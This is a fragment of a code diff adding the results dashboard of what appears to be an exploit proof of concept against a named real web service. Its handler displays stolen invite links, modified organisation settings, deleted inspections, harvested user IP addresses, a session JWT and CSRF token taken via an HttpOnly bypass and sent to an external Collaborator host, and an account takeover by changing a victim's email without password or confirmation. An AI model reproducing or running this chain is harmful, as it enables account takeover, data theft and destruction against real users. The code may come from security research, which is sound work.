+          var linksHtml = si.links.map(function(l) {
+            return '<div class="invite-box"><div class="link">https://app.au.safetyculture.com/' + esc(l) + '</div></div>';
+          }).join('');
+          addCard('stolen', '<span class="crud-badge crud-r">READ</span> Stolen Existing Invites (' + si.count + ')', 'red', linksHtml, true);
+        }
+      } catch(e) {}
+      break;
+
+    case 'SETTINGS-WRITE':
+      pct();
+      try {
+        var sw = JSON.parse(data);
+        tlAdd('UPDATE: Org settings modified (response: ' + sw.response_len + ' bytes)');
+        addCard('settings', '<span class="crud-badge crud-u">UPDATE</span> Org Settings Modified', 'yellow',
+          '<div class="val"><span class="label">Write Confirmed</span><span class="secret">YES</span>' +
+          '<span class="label">Response Length</span>' + sw.response_len + ' bytes</div>');
+      } catch(e) {}
+      break;
+
+    case 'INSPECTIONS':
+      pct();
+      try {
+        var insp = JSON.parse(data);
+        tlAdd('READ: ' + insp.count + ' inspections accessible');
+      } catch(e) {}
+      break;
+
+    case 'DELETE-INSPECTION':
+      pct();
+      try {
+        var di = JSON.parse(data);
+        tlAdd('DELETE: Inspection ' + di.auditId + ' — ' + di.status, 'destroy');
+        addCard('delete', '<span class="crud-badge crud-d">DELETE</span> Inspection Archived <span class="badge destroy">DESTROYED</span>', 'purple',
+          '<div class="val"><span class="label">Inspection ID</span><span class="secret">' + esc(di.auditId || '') + '</span>' +
+          '<span class="label">Status</span><span class="highlight">' + esc(di.status) + '</span></div>');
+      } catch(e) {}
+      break;
+
+    case 'ACTIVITY-LOGS':
+      pct();
+      try {
+        var al = JSON.parse(data);
+        tlAdd('READ: Activity logs — ' + al.len + ' bytes, IPs: ' + JSON.stringify(al.ips));
+        var ipHtml = '<div class="val"><span class="label">Response Size</span>' + al.len + ' bytes';
+        if (al.ips && al.ips.length > 0) {
+          ipHtml += '<span class="label">IP Addresses</span>';
+          al.ips.forEach(function(ip) { ipHtml += '<span class="secret">' + esc(ip) + '</span> '; });
+        }
+        ipHtml += '</div>';
+        addCard('activity', '<span class="crud-badge crud-r">READ</span> Activity Logs — IPs <span class="badge warn">PII</span>', 'blue', ipHtml);
+      } catch(e) {}
+      break;
+
+    // ─── SetCookies HttpOnly Bypass ───
+    case 'SETCOOKIES-HTTPONLY':
+      pct();
+      try {
+        var sc = JSON.parse(data);
+        tlAdd('HTTPONLY BYPASS: s12at JWT EXTRACTED (' + sc.jwt_len + ' chars), user_id=' + (sc.user_id || '?'), 'active');
+        var scHtml = '<div class="val">';
+        scHtml += '<span class="label">HttpOnly Bypass</span><span class="highlight" style="background:#b71c1c">s12at JWT VALUE EXTRACTED FROM RESPONSE BODY</span>';
+        if (sc.jwt_len > 0) {
+          scHtml += '<span class="label">Stolen JWT (first 80 chars)</span><span class="secret">' + esc(sc.jwt_preview || '') + '</span>';
+          scHtml += '<span class="label">JWT Length</span>' + sc.jwt_len + ' chars (full token extracted)';
+        }
+        if (sc.user_id) scHtml += '<span class="label">Victim user_id (from JWT sub)</span><span class="secret">' + esc(sc.user_id) + '</span>';
+        if (sc.exp) scHtml += '<span class="label">JWT Expiry</span>' + new Date(sc.exp * 1000).toISOString();
+        if (sc.org) scHtml += '<span class="label">Organization</span>' + esc(sc.org);
+        if (sc.session_len > 0) scHtml += '<span class="label">Session Cookie Stolen</span><span class="secret">' + sc.session_len + ' chars (HttpOnly bypassed)</span>';
+        if (sc.crumb) scHtml += '<span class="label">CSRF Token</span><span class="secret">' + esc(sc.crumb) + '</span>';
+        scHtml += '<span class="label">Response Size</span>' + sc.response_bytes + ' bytes';
+        scHtml += '</div>';
+        scHtml += '<div class="httponly-note"><strong>HTTPONLY BYPASS PROVEN.</strong> The s12at cookie is HttpOnly &mdash; document.cookie cannot read it. But SetCookies returns the FULL JWT value in the gRPC response body. JavaScript reads the ArrayBuffer and extracts the token. Attacker now has a <strong>PORTABLE JWT</strong> usable from any device, any IP &mdash; no XSS connection needed. Exfiltrated via POST to Collaborator.</div>';
+        addCard('httponly', '<span class="crud-badge crud-s">STEAL</span> HttpOnly JWT Bypass <span class="badge httponly">HTTPONLY BYPASSED</span>', 'red', scHtml, true);
+      } catch(e) { tlAdd('SetCookies parse error: ' + e, 'error'); }
+      break;
+
+    case 'SETCOOKIES-ERR':
+      tlAdd('SetCookies error: ' + data, 'error');
+      break;
+
+    // ─── UpdateEmail ATO ───
+    case 'UPDATEEMAIL-ATO':
+      pct();
+      try {
+        var ue = JSON.parse(data);
+        var emailOk = ue.success || ue.grpc_status === '0';
+        tlAdd('EMAIL: ' + (emailOk ? 'CHANGED' : 'gs:' + ue.grpc_status) + ' — ' + ue.victim_uid + ' → ' + ue.new_email, emailOk ? 'destroy' : 'error');
+        var ueHtml = '<div class="val">';
+        ueHtml += '<span class="label">Status</span><span class="highlight" style="background:' + (emailOk ? '#1b5e20' : '#b71c1c') + '">' + (emailOk ? 'EMAIL CHANGED — PERMANENT ATO' : 'grpc-status:' + ue.grpc_status) + '</span>';
+        ueHtml += '<span class="label">Victim</span><span class="secret">' + esc(ue.victim_uid) + '</span>';
+        ueHtml += '<span class="label">New Email</span><span class="secret">' + esc(ue.new_email) + '</span>';
+        ueHtml += '<span class="label">gRPC Status</span>' + ue.grpc_status + (emailOk ? ' (OK — no password, no confirmation)' : '');
+        ueHtml += '</div>';
+        if (emailOk) {
+          ueHtml += '<div class="httponly-note" style="background:#1a0a00;border-color:#ff9100"><strong>PERMANENT ATO.</strong> Victim email changed to attacker address WITHOUT password or email confirmation. Attacker: password reset &rarr; link sent to new email &rarr; full account takeover. Admin CANNOT revert via same endpoint (gs:7).</div>';
+        }
+        addCard('updateemail', '<span class="crud-badge crud-s">ATO</span> Email Changed ' + (emailOk ? '<span class="badge email">PERMANENT ATO</span>' : '<span class="badge warn">BLOCKED</span>'), emailOk ? 'purple' : 'yellow', ueHtml, true);
+      } catch(e) { tlAdd('UpdateEmail parse error: ' + e, 'error'); }
+      break;
+
+    case 'UPDATEEMAIL-ERR':
+      tlAdd('UpdateEmail error: ' + data, 'error');
+      break;
+
+    case 'CRUD-STARTED':
+      tlAdd('All requests dispatched — results appearing below', 'active');
+      setStatus('Full chain running — check Collaborator for callbacks tagged /sc-*');
+      break;
+
+    default:
+      tlAdd('[' + api + '] ' + (typeof data === 'string' ? data.substring(0, 200) : ''));
+  }
+});
+</script>
+</body>
+</html>
